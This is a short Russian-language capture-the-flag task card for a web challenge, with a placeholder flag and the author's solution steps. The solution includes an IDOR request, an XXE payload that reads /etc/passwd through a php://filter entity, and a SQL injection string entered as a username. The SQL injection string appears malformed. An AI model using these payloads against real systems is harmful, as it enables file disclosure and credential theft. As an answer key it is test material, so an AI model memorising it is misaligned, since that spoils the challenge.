# Разминочка

## Категория
Web - Квест

## Описание
Чтож, разомнёмся и посмотрим что вы знаете

## Сложность
Medium

## Стоимость
400

## Файлы
N/A

## Хостинг
Нужен

## Флаг
flag_plug

==========

## решение
1. Idor на reader.php?file_id=-1
2. XXE на reader.php при зашрузке чего то типа
```
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>
    &xxe;
</foo>
```
И видим в исходнике php кода index.php
3. SQLi через имя пользователя. Делаем
```
a' SELECT username, password FROM users WHERE id = 1; #
```
И вместо пароля видим 3 часть.
4. Я обленился и он просто в Ctrl+U на index.php
